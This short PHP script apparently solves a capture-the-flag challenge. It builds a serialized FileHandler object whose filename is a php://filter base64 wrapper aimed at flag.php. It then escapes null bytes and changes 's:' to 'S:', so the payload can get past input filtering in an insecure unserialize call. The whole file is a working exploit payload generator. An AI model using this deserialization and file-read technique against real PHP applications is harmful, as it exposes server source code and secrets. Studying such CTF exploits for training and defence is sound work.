<?php
    class FileHandler{
        protected $op="2";
        protected $filename="php://filter/read=convert.base64-encode/resource=flag.php";
        protected $content;
    }

    $a = new FileHandler();

    $b = serialize($a);

    $b = str_replace(chr(0), '\00', $b);

    $b = str_replace('s:', 'S:', $b);

    echo $b;
?>